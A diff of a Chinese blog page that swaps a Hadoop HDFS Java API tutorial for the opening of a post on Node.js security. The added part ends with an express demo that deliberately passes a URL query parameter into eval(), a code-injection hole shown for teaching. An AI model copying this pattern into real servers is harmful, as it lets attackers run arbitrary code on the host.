@@ -70,7 +70,7 @@
 
 
 
-  <meta name="keywords" content="hadoop,">
+  <meta name="keywords" content="web安全">
 
 
 
@@ -83,27 +83,34 @@
 
 
 
-<meta name="description" content="0x00 前言关于hadoop的搭建，可以参考之前的一篇文章Centos7搭建Hadoop伪分布式集群详细步骤本篇主要讲解如何使用Hadoop java api远程连接hadoop分布式文件系统（HDFS） 0x01 本地操作HDFS在远程连接HDFS之前，先本地操作一波，便于对HDFS有个更深层的认识。 首先应该对HDFS的概念有个认识，他就是一个文件系统，只不过是适应于hadoop的分布式文件">
-<meta name="keywords" content="hadoop">
+<meta name="description" content="0x00 前言Node.js 是一个基于 Chrome V8 引擎的 JavaScript 运行环境。Node 是一个让 JavaScript 运行在服务端的开发平台，它让 JavaScript 成为与PHP、Python、Perl、Ruby 等服务端语言平起平坐的脚本语言。因为在之前并没有了解过nodejs的所产生的安全问题，本文将以node.js框架express为例，浅析nodejs安全问题">
+<meta name="keywords" content="web安全 代码审计">
 <meta property="og:type" content="article">
-<meta property="og:title" content="使用Hadoop JAVA API 远程连接HDFS">
-<meta property="og:url" content="https://zhengbao.wang/使用Hadoop-JAVA-API-远程连接HDFS/index.html">
+<meta property="og:title" content="Nodejs安全">
+<meta property="og:url" content="https://zhengbao.wang/Nodejs安全/index.html">
 <meta property="og:site_name" content="Boogle&#39;s Blog">
-<meta property="og:description" content="0x00 前言关于hadoop的搭建，可以参考之前的一篇文章Centos7搭建Hadoop伪分布式集群详细步骤本篇主要讲解如何使用Hadoop java api远程连接hadoop分布式文件系统（HDFS） 0x01 本地操作HDFS在远程连接HDFS之前，先本地操作一波，便于对HDFS有个更深层的认识。 首先应该对HDFS的概念有个认识，他就是一个文件系统，只不过是适应于hadoop的分布式文件">
+<meta property="og:description" content="0x00 前言Node.js 是一个基于 Chrome V8 引擎的 JavaScript 运行环境。Node 是一个让 JavaScript 运行在服务端的开发平台，它让 JavaScript 成为与PHP、Python、Perl、Ruby 等服务端语言平起平坐的脚本语言。因为在之前并没有了解过nodejs的所产生的安全问题，本文将以node.js框架express为例，浅析nodejs安全问题">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://i.loli.net/2019/03/29/5c9e1850124c7.png">
-<meta property="og:image" content="https://i.loli.net/2019/03/29/5c9e19572a8b5.png">
-<meta property="og:image" content="https://i.loli.net/2019/03/29/5c9e1c1fc8e2c.png">
-<meta property="og:image" content="https://i.loli.net/2019/03/29/5c9e1cba5d20a.png">
-<meta property="og:image" content="https://i.loli.net/2019/03/29/5c9e1dbc73a0e.png">
-<meta property="og:image" content="https://i.loli.net/2019/03/29/5c9e1e0813184.png">
-<meta property="og:image" content="https://i.loli.net/2019/03/29/5c9e1e89e6e02.png">
-<meta property="og:image" content="https://i.loli.net/2019/03/29/5c9e1ec5aaa5f.png">
-<meta property="og:updated_time" content="2019-05-08T02:40:43.496Z">
+<meta property="og:image" content="https://i.loli.net/2019/07/12/5d2882fb3610d56344.png">
+<meta property="og:image" content="https://i.loli.net/2019/07/12/5d28846f8727a76819.png">
+<meta property="og:image" content="https://i.loli.net/2019/07/12/5d28865b486e137355.png">
+<meta property="og:image" content="https://i.loli.net/2019/07/12/5d2888947cf8370728.png">
+<meta property="og:image" content="https://i.loli.net/2019/07/12/5d28894f0822b82705.png">
+<meta property="og:image" content="https://i.loli.net/2019/07/12/5d2889c16bdee95884.png">
+<meta property="og:image" content="https://i.loli.net/2019/07/16/5d2d2ea8632f956229.png">
+<meta property="og:image" content="https://i.loli.net/2019/07/16/5d2d2e91221c876341.png">
+<meta property="og:image" content="https://i.loli.net/2019/07/16/5d2d38593d54c25929.png">
+<meta property="og:image" content="https://i.loli.net/2019/07/16/5d2d38a07e94893643.png">
+<meta property="og:image" content="https://i.loli.net/2019/07/16/5d2d38dc0856c30683.png">
+<meta property="og:image" content="https://i.loli.net/2019/07/16/5d2d39482974b24029.png">
+<meta property="og:image" content="https://i.loli.net/2019/08/07/9Py6NVuzFOjYB5l.png">
+<meta property="og:image" content="https://i.loli.net/2019/08/07/ygQtSMiX3JIWldn.png">
+<meta property="og:image" content="https://i.loli.net/2019/08/07/yxjezVQbuZApCcK.png">
+<meta property="og:updated_time" content="2019-08-07T06:54:41.901Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="使用Hadoop JAVA API 远程连接HDFS">
-<meta name="twitter:description" content="0x00 前言关于hadoop的搭建，可以参考之前的一篇文章Centos7搭建Hadoop伪分布式集群详细步骤本篇主要讲解如何使用Hadoop java api远程连接hadoop分布式文件系统（HDFS） 0x01 本地操作HDFS在远程连接HDFS之前，先本地操作一波，便于对HDFS有个更深层的认识。 首先应该对HDFS的概念有个认识，他就是一个文件系统，只不过是适应于hadoop的分布式文件">
-<meta name="twitter:image" content="https://i.loli.net/2019/03/29/5c9e1850124c7.png">
+<meta name="twitter:title" content="Nodejs安全">
+<meta name="twitter:description" content="0x00 前言Node.js 是一个基于 Chrome V8 引擎的 JavaScript 运行环境。Node 是一个让 JavaScript 运行在服务端的开发平台，它让 JavaScript 成为与PHP、Python、Perl、Ruby 等服务端语言平起平坐的脚本语言。因为在之前并没有了解过nodejs的所产生的安全问题，本文将以node.js框架express为例，浅析nodejs安全问题">
+<meta name="twitter:image" content="https://i.loli.net/2019/07/12/5d2882fb3610d56344.png">
 
 
 
@@ -133,13 +140,13 @@
 
 
 
-  <link rel="canonical" href="https://zhengbao.wang/使用Hadoop-JAVA-API-远程连接HDFS/">
+  <link rel="canonical" href="https://zhengbao.wang/Nodejs安全/">
 
 
 
 
 
-  <title>使用Hadoop JAVA API 远程连接HDFS | Boogle's Blog</title>
+  <title>Nodejs安全 | Boogle's Blog</title>
   
 
 
@@ -311,7 +318,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://zhengbao.wang/使用Hadoop-JAVA-API-远程连接HDFS/">
+    <link itemprop="mainEntityOfPage" href="https://zhengbao.wang/Nodejs安全/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="boogle">
@@ -328,7 +335,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">使用Hadoop JAVA API 远程连接HDFS</h1>
+          <h1 class="post-title" itemprop="name headline">Nodejs安全</h1>
         
 
         <div class="post-meta">
@@ -340,8 +347,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-29T21:43:10+08:00">
-                2019-03-29
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-07T14:53:18+08:00">
+                2019-08-07
               </time>
             
 
@@ -351,28 +358,6 @@
           </span>
 
           
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/环境配置/" itemprop="url" rel="index">
-                    <span itemprop="name">环境配置</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
 
           
             
@@ -381,8 +366,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/使用Hadoop-JAVA-API-远程连接HDFS/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/使用Hadoop-JAVA-API-远程连接HDFS/" itemprop="commentCount"></span>
+                <a href="/Nodejs安全/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/Nodejs安全/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -390,7 +375,7 @@
 
           
           
-             <span id="/使用Hadoop-JAVA-API-远程连接HDFS/" class="leancloud_visitors" data-flag-title="使用Hadoop JAVA API 远程连接HDFS">
+             <span id="/Nodejs安全/" class="leancloud_visitors" data-flag-title="Nodejs安全">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-eye"></i>
@@ -431,7 +416,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  18 分钟
+                  15 分钟
                 </span>
               
             </div>
@@ -452,32 +437,23 @@
       
 
       
-        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>关于hadoop的搭建，可以参考之前的一篇文章<a href="http://zhengbao.wang/Centos7%E6%90%AD%E5%BB%BAHadoop%E4%BC%AA%E5%88%86%E5%B8%83%E5%BC%8F%E9%9B%86%E7%BE%A4%E8%AF%A6%E7%BB%86%E6%AD%A5%E9%AA%A4/">Centos7搭建Hadoop伪分布式集群详细步骤</a><br>本篇主要讲解如何使用Hadoop java api远程连接hadoop分布式文件系统（HDFS）</p>
-<h2 id="0x01-本地操作HDFS"><a href="#0x01-本地操作HDFS" class="headerlink" title="0x01 本地操作HDFS"></a>0x01 本地操作HDFS</h2><p>在远程连接HDFS之前，先本地操作一波，便于对HDFS有个更深层的认识。</p>
-<p>首先应该对HDFS的概念有个认识，他就是一个文件系统，只不过是适应于hadoop的分布式文件系统，既然是文件系统，其就可以执行跟普通文件系统一样的操作，例如文件操作，目录操作等。<br>下面演示几个简单的例子。</p>
-<ul>
-<li><p>列出目录文件<br><code>hadoop fs -ls \</code><br><img src="https://i.loli.net/2019/03/29/5c9e1850124c7.png" alt></p>
-</li>
-<li><p>创建文件<br><code>hadoop fs -touchz /hello</code><br><img src="https://i.loli.net/2019/03/29/5c9e19572a8b5.png" alt></p>
-</li>
-</ul>
-<p>更多命令参考<a href="https://segmentfault.com/a/1190000002672666" target="_blank" rel="noopener">hadoop HDFS常用文件操作命令</a></p>
-<h2 id="0x02-IDEA远程连接HDFS"><a href="#0x02-IDEA远程连接HDFS" class="headerlink" title="0x02 IDEA远程连接HDFS"></a>0x02 IDEA远程连接HDFS</h2><h3 id="准备环境"><a href="#准备环境" class="headerlink" title="准备环境"></a>准备环境</h3><p>首先在windows环境下安装hadoop并配置环境变量。<br>windows下配置java jdk。<br>下载winutils：<a href="https://github.com/steveloughran/winutils" target="_blank" rel="noopener">https://github.com/steveloughran/winutils</a><br>按照自己hadoop版本选择<code>hadoop.dll</code> <code>winutils.exe</code>放到hadoop bin目录下<br><img src="https://i.loli.net/2019/03/29/5c9e1c1fc8e2c.png" alt></p>
-<h3 id="建立工程"><a href="#建立工程" class="headerlink" title="建立工程"></a>建立工程</h3><p>在IDEA下新建Maven工程<br><img src="https://i.loli.net/2019/03/29/5c9e1cba5d20a.png" alt></p>
-<p>创建过程中右下角会出现import提醒，点击import。</p>
-<p>创建完成后下载对应版本的hadoop pom.xml文件<br>这里我的为<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hadoop<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hadoop-common<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hadoop<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hadoop-mapreduce-client-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hadoop<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hadoop-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.hadoop<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hadoop-hdfs<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>将之前配置的<code>core-site.xml</code> <code>hdfs-site.xml</code> <code>log4j.properties</code>复制到resources目录</p>
-<p>目录结构如下<br><img src="https://i.loli.net/2019/03/29/5c9e1dbc73a0e.png" alt></p>
-<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>新建class<br><img src="https://i.loli.net/2019/03/29/5c9e1e0813184.png" alt><br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">package hadoop;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">import</span> org.apache.hadoop.conf.Configuration;</span><br><span class="line">        <span class="keyword">import</span> org.apache.hadoop.fs.FSDataInputStream;</span><br><span class="line">        <span class="keyword">import</span> org.apache.hadoop.fs.FSDataOutputStream;</span><br><span class="line">        <span class="keyword">import</span> org.apache.hadoop.fs.<span class="built_in">FileSystem</span>;</span><br><span class="line">        <span class="keyword">import</span> org.apache.hadoop.fs.Path;</span><br><span class="line">        <span class="keyword">import</span> org.apache.hadoop.io.IOUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> class hadoop&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(<span class="keyword">String</span>[] args)&#123;</span><br><span class="line">        <span class="built_in">try</span>&#123;</span><br><span class="line">            <span class="keyword">String</span> filename = <span class="string">"hdfs://192.168.111.141:9000/user/input/boogle.txt"</span>;</span><br><span class="line">            Configuration configuration = <span class="keyword">new</span> Configuration();</span><br><span class="line">            <span class="built_in">FileSystem</span> fileSystem = <span class="built_in">FileSystem</span>.<span class="built_in">get</span>(configuration);</span><br><span class="line">            <span class="built_in">if</span>(fileSystem.<span class="built_in">exists</span>(<span class="keyword">new</span> Path(filename)))</span><br><span class="line">            &#123;</span><br><span class="line">                System.out.<span class="built_in">println</span>(<span class="string">"文件存在"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">else</span>&#123;</span><br><span class="line">                System.out.<span class="built_in">println</span>(<span class="string">"文件不存在"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            Path inFile = <span class="keyword">new</span> Path(<span class="string">"/user/input/boogle.txt"</span>);</span><br><span class="line">            FSDataOutputStream os = fileSystem.create(inFile);</span><br><span class="line">            os.writeUTF(<span class="string">"Chinese Hadoop Community"</span>);</span><br><span class="line">            os.<span class="built_in">flush</span>();</span><br><span class="line">            os.<span class="built_in">close</span>();</span><br><span class="line">            FSDataInputStream is = fileSystem.<span class="built_in">open</span>(inFile);</span><br><span class="line">            IOUtils.copyBytes(is,System.out,<span class="number">1024</span>,true);</span><br><span class="line">        &#125;<span class="built_in">catch</span> (Exception e)</span><br><span class="line">        &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>按照自己环境修改一下上面的代码。</p>
-<p>之前本地搭建的时候连接hdfs用的localhost，此处远程连接需换成ip。<br>如我的core-site.xml<br><img src="https://i.loli.net/2019/03/29/5c9e1e89e6e02.png" alt></p>
-<p>查看运行结果<br><img src="https://i.loli.net/2019/03/29/5c9e1ec5aaa5f.png" alt></p>
-<h3 id="详细代码"><a href="#详细代码" class="headerlink" title="详细代码"></a>详细代码</h3><p>常用hdfs java api已封装好，直接在main函数中调用即可。<br><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> hadoop;</span><br><span class="line">        <span class="keyword">import</span> java.io.IOException;</span><br><span class="line">        <span class="keyword">import</span> java.net.URI;</span><br><span class="line">        <span class="keyword">import</span> java.net.URISyntaxException;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">import</span> org.apache.hadoop.conf.Configuration;</span><br><span class="line">        <span class="keyword">import</span> org.apache.hadoop.fs.FSDataInputStream;</span><br><span class="line">        <span class="keyword">import</span> org.apache.hadoop.fs.FSDataOutputStream;</span><br><span class="line">        <span class="keyword">import</span> org.apache.hadoop.fs.FileSystem;</span><br><span class="line">        <span class="keyword">import</span> org.apache.hadoop.fs.Path;</span><br><span class="line">        <span class="keyword">import</span> org.apache.hadoop.io.IOUtils;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">import</span> org.apache.hadoop.fs.FileStatus;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> class Hdfs &#123;</span><br><span class="line">    <span class="keyword">static</span> Configuration conf = <span class="keyword">new</span> Configuration();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> FileSystem hdfs;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> init()&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        hdfs = FileSystem.<span class="built_in">get</span>(conf);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span>(</span><br><span class="line">    IOException e)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> main(<span class="keyword">String</span>[] args)&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">             listFiles(<span class="string">"/user"</span>);</span><br><span class="line">             createDir(<span class="string">"/user/input"</span>);</span><br><span class="line">             createFile(<span class="string">"/user/input/test1.txt"</span>,<span class="string">"HelloWoRLd ,It is 2019"</span>);</span><br><span class="line">             createFile(<span class="string">"/user/input/test2.txt"</span>,<span class="string">"hello boogle ,Your Site Is :zhengbao,wang"</span>);</span><br><span class="line">             listFiles(<span class="string">"/user/input"</span>);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> createDir(<span class="keyword">String</span> dir) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        init();</span><br><span class="line">        <span class="comment">//System.out.println("newdir \t" + conf.get("fs.defaultFS") + dir);</span></span><br><span class="line">        Path path = <span class="keyword">new</span> Path(dir);</span><br><span class="line"></span><br><span class="line">        hdfs.mkdirs(path);</span><br><span class="line">        System.out.<span class="built_in">println</span>(<span class="string">"newdir \t"</span> + conf.<span class="built_in">get</span>(<span class="string">"fs.defaultFS"</span>) + dir);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//copy from local file to HDFS file</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> copyFile(<span class="keyword">String</span> localSrc,<span class="keyword">String</span> hdfsDst) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        init();</span><br><span class="line">        Path src = <span class="keyword">new</span> Path(localSrc);</span><br><span class="line">        Path dst = <span class="keyword">new</span> Path(hdfsDst);</span><br><span class="line">        hdfs.copyFromLocalFile(src, dst);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//list all the files in thecurrent direction</span></span><br><span class="line">        FileStatus files[] = hdfs.listStatus(dst);</span><br><span class="line">        System.out.<span class="built_in">println</span>(<span class="string">"Uploadto \t"</span> + conf.<span class="built_in">get</span>(<span class="string">"fs.defaultFS"</span>) + hdfsDst);</span><br><span class="line">        <span class="keyword">for</span> (FileStatus file : files) &#123;</span><br><span class="line">            System.out.<span class="built_in">println</span>(file.getPath());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//create a new file</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span>  <span class="keyword">void</span> createFile(<span class="keyword">String</span> fileName,<span class="keyword">String</span> fileContent) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        init();</span><br><span class="line">        Path dst = <span class="keyword">new</span> Path(fileName);</span><br><span class="line">        <span class="built_in">byte</span>[] bytes =fileContent.getBytes();</span><br><span class="line">        FSDataOutputStream output =hdfs.create(dst);</span><br><span class="line">        output.write(bytes);</span><br><span class="line">        System.out.<span class="built_in">println</span>(<span class="string">"newfile \t"</span> + conf.<span class="built_in">get</span>(<span class="string">"fs.defaultFS"</span>) + fileName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//list all files</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> listFiles(<span class="keyword">String</span> dirName)<span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        init();</span><br><span class="line">        Path f = <span class="keyword">new</span> Path(dirName);</span><br><span class="line">        FileStatus[] status =hdfs.listStatus(f);</span><br><span class="line">        System.out.<span class="built_in">println</span>(dirName +<span class="string">" has all files:"</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i&lt;status.length; i++) &#123;</span><br><span class="line">            System.out.<span class="built_in">println</span>(status[i].getPath().toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> deleteFile(<span class="keyword">String</span> fileName)<span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        init();</span><br><span class="line">        Path f = <span class="keyword">new</span> Path(fileName);</span><br><span class="line">        <span class="built_in">boolean</span> isExists =hdfs.exists(f);</span><br><span class="line">        <span class="keyword">if</span> (isExists) &#123;      <span class="comment">//if exists, delete</span></span><br><span class="line">            <span class="built_in">boolean</span> isDel =hdfs.delete(f,<span class="keyword">true</span>);</span><br><span class="line">            System.out.<span class="built_in">println</span>(fileName+ <span class="string">"  delete? \t"</span> + isDel);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.<span class="built_in">println</span>(fileName+ <span class="string">"  exist? \t"</span> + isExists);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<h2 id="0x03-问题解决"><a href="#0x03-问题解决" class="headerlink" title="0x03 问题解决"></a>0x03 问题解决</h2><p>因为之前hadoop环境已经搭好，容易出现的问题主要是配置IDEA配置问题和网络连接问题。</p>
-<ul>
-<li>关于配置没有详细讲，但是要按照每一个步骤自己操作为，并无难度，勿丢步骤即可。</li>
-<li>关于网络连接，主要出现的问题在于防火墙禁止连接9000端口 可通过修改hosts或者修改防火墙配置</li>
-</ul>
+        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Node.js 是一个基于 Chrome V8 引擎的 JavaScript 运行环境。Node 是一个让 JavaScript 运行在服务端的开发平台，它让 JavaScript 成为与PHP、Python、Perl、Ruby 等服务端语言平起平坐的脚本语言。因为在之前并没有了解过nodejs的所产生的安全问题，本文将以node.js框架<code>express</code>为例，浅析nodejs安全问题。</p>
+<h2 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h2><p>本次测试使用express框架，环境搭建很简单，只需新建一个工作目录，然后执行<code>npm install expres –save</code>,即可使用<code>express</code>。<br>演示代码如下<code>test.js</code><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line"> <span class="keyword">var</span> resp=<span class="built_in">eval</span>(<span class="string">"("</span>+req.query.input+<span class="string">")"</span>);</span><br><span class="line"> res.send(<span class="string">'Output&lt;/br&gt;'</span>+resp);</span><br><span class="line">&#125;);</span><br><span class="line">app.listen(<span class="number">8001</span>);</span><br></pre></td></tr></table></figure></p>
